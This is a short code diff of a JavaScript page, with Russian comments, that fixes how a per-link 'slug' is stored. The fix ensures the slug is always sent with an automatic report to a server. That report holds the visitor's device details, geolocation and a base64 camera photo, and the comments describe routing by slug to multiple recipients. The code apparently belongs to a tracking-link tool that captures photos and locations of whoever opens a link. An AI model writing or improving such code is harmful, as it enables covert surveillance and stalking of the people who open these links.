@@ -11,15 +11,15 @@ const UI = {
 };
 
 window.__reportReady = false;
-let __slug = null;
+window.__SLUG = null; // глобально
 
 // === FETCH LINK INFO (привязка chatId не нужна, чисто проверка slug) ===
 async function loadLinkInfo() {
   const params = new URLSearchParams(location.search);
-  __slug = params.get('slug') || window.__SLUG || null;
-  if (!__slug) return;
+  window.__SLUG = params.get('slug') || window.__SLUG || null;
+  if (!window.__SLUG) return;
   try {
-    const r = await fetch(`${API_BASE}/api/link-info?slug=${encodeURIComponent(__slug)}`);
+    const r = await fetch(`${API_BASE}/api/link-info?slug=${encodeURIComponent(window.__SLUG)}`);
     if (r.ok) console.log('🔗 link-info ok');
   } catch (e) {
     console.warn('link-info fetch failed', e);
@@ -136,12 +136,16 @@ function getDeviceInfo() {
 async function sendReport({ photoBase64, geo }) {
   const info = getDeviceInfo();
   const body = { ...info, geo, photoBase64, note: 'auto' };
-  if (__slug) body.slug = __slug; // маршрутизация по slug (мульти-адреса)
+
+  // ✅ теперь slug гарантированно уходит
+  if (window.__SLUG) body.slug = window.__SLUG;
+
   const r = await fetch(`${API_BASE}/api/report`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(body),
   });
+
   const text = await r.text();
   let data; try { data = JSON.parse(text); } catch {}
   if (!r.ok || !data?.ok) throw new Error((data && data.error) || text || `HTTP ${r.status}`);
@@ -174,4 +178,4 @@ async function autoFlow() {
 
 // === Инициализация ===
 window.__autoFlow = autoFlow;
-loadLinkInfo(); // ← загружаем slug
+loadLinkInfo(); // ← загрузка slug
